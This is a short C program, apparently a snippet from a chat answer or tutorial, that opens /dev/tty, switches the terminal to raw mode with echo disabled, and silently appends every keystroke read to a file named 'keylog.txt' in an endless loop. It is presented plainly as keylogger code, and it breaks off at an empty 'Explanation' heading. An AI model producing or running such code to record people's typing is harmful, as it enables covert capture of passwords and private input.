#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <fcntl.h>

#define KEYLOG_FILE "keylog.txt"

void setup_tty(int fd) {
    struct termios tty;
    if (tcgetattr(fd, &tty) != 0) {
        perror("tcgetattr");
        exit(1);
    }

    cfsetospeed(&tty, B9600);
    cfsetispeed(&tty, B9600);

    tty.c_iflag &= ~(IGNBRK | BRKINT | PARMRK | ISTRIP | INLCR | IGNCR | ICRNL | IXON);
    tty.c_oflag &= ~OPOST;
    tty.c_lflag &= ~(ECHO | ECHONL | ICANON | ISIG | IEXTEN);
    tty.c_cflag &= ~(CSIZE | PARENB);
    tty.c_cflag |= CS8;

    if (tcsetattr(fd, TCSANOW, &tty) != 0) {
        perror("tcsetattr");
        exit(1);
    }
}

void log_key(int key) {
    FILE *file = fopen(KEYLOG_FILE, "a");
    if (file) {
        fprintf(file, "%c", key);
        fclose(file);
    }
}

int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    setup_tty(fd);

    while (1) {
        char c;
        if (read(fd, &c, 1) == 1) {
            log_key(c);
        }
    }

    close(fd);
    return 0;
}
```

### Explanation:
